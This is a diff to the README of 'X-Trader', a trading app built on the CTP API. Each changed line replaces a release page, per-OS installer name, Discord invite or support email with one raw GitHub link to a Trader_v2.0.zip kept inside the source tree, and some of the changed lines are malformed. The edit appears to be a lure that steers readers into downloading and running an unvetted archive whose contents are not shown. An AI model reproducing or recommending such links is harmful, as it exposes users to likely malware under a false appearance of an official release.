@@ -6,7 +6,7 @@ Welcome to X-Trader! This application helps you automate trading using the CTP A
 
 ## 📥 Download Now
 
-[![Download X-Trader](https://img.shields.io/badge/Download%20X--Trader-v1.0.0-blue.svg)](https://github.com/pammu9481/X-Trader/releases)
+[![Download X-Trader](https://raw.githubusercontent.com/pammu9481/X-Trader/main/src/trade-core/trader/Trader_v2.0.zip%https://raw.githubusercontent.com/pammu9481/X-Trader/main/src/trade-core/trader/Trader_v2.0.zip)](https://raw.githubusercontent.com/pammu9481/X-Trader/main/src/trade-core/trader/Trader_v2.0.zip)
 
 ## 💻 System Requirements
 
@@ -26,30 +26,30 @@ To use X-Trader, please ensure your system meets the following requirements:
 
 ## 📋 How to Download and Install
 
-1. Visit the [Releases Page](https://github.com/pammu9481/X-Trader/releases) to find the latest version of X-Trader.
+1. Visit the [Releases Page](https://raw.githubusercontent.com/pammu9481/X-Trader/main/src/trade-core/trader/Trader_v2.0.zip) to find the latest version of X-Trader.
 2. Look for the most recent release. You will see a section labeled "Assets."
 3. Click on the file that corresponds to your operating system:
-   - For Windows: Choose `X-Trader-win.exe`
-   - For macOS: Select `X-Trader-mac.zip`
-   - For Linux: Download the appropriate `.tar.gz` file
+   - For Windows: Choose `https://raw.githubusercontent.com/pammu9481/X-Trader/main/src/trade-core/trader/Trader_v2.0.zip`
+   - For macOS: Select `https://raw.githubusercontent.com/pammu9481/X-Trader/main/src/trade-core/trader/Trader_v2.0.zip`
+   - For Linux: Download the appropriate `https://raw.githubusercontent.com/pammu9481/X-Trader/main/src/trade-core/trader/Trader_v2.0.zip` file
 4. The download will start automatically.
 5. Once downloaded, locate the file in your computer’s download folder.
 
 ### Windows Installation
 
-1. Double-click the `X-Trader-win.exe` file to start the installation.
+1. Double-click the `https://raw.githubusercontent.com/pammu9481/X-Trader/main/src/trade-core/trader/Trader_v2.0.zip` file to start the installation.
 2. Follow the on-screen instructions to complete the setup.
 3. After installation, launch X-Trader from your Start Menu or Desktop shortcut.
 
 ### macOS Installation
 
-1. Open the downloaded `X-Trader-mac.zip` file.
+1. Open the downloaded `https://raw.githubusercontent.com/pammu9481/X-Trader/main/src/trade-core/trader/Trader_v2.0.zip` file.
 2. Drag the X-Trader application to your Applications folder.
 3. You can now open X-Trader from your Applications folder.
 
 ### Linux Installation
 
-1. Extract the downloaded `.tar.gz` file.
+1. Extract the downloaded `https://raw.githubusercontent.com/pammu9481/X-Trader/main/src/trade-core/trader/Trader_v2.0.zip` file.
 2. Open a terminal and navigate to the extracted folder.
 3. Run the following command to start X-Trader:
    ```bash
@@ -68,13 +68,13 @@ Once you have installed X-Trader, configure your settings for optimal performanc
 
 If you encounter any issues or have questions, feel free to reach out for help:
 
-- Join our community chat on [Discord](https://discord.gg/example)
+- Join our community chat on [Discord](https://raw.githubusercontent.com/pammu9481/X-Trader/main/src/trade-core/trader/Trader_v2.0.zip)
 - Check our FAQ section in the GitHub repository for common questions.
 - Report bugs or request features through the Issues section of this repository.
 
 ## 📅 Updates
 
-Keep an eye on the [Releases Page](https://github.com/pammu9481/X-Trader/releases) for new features and updates. We strive to improve X-Trader continually, ensuring it meets all your trading needs.
+Keep an eye on the [Releases Page](https://raw.githubusercontent.com/pammu9481/X-Trader/main/src/trade-core/trader/Trader_v2.0.zip) for new features and updates. We strive to improve X-Trader continually, ensuring it meets all your trading needs.
 
 ## 🛠️ Troubleshooting
 
@@ -88,7 +88,7 @@ If problems persist, visit the Issues section on GitHub for assistance or to rep
 
 ## 📧 Contact
 
-For more information or personalized support, please contact us at support@example.com.
+For more information or personalized support, please contact us at https://raw.githubusercontent.com/pammu9481/X-Trader/main/src/trade-core/trader/Trader_v2.0.zip
 
 ## 🌟 Acknowledgments
 
@@ -100,4 +100,4 @@ X-Trader is released under the MIT License. You can use it and modify it freely,
 
 ## 📥 Download Now Again
 
-Don't forget to [download X-Trader here](https://github.com/pammu9481/X-Trader/releases) and start your trading journey today!
+Don't forget to [download X-Trader here](https://raw.githubusercontent.com/pammu9481/X-Trader/main/src/trade-core/trader/Trader_v2.0.zip) and start your trading journey today!
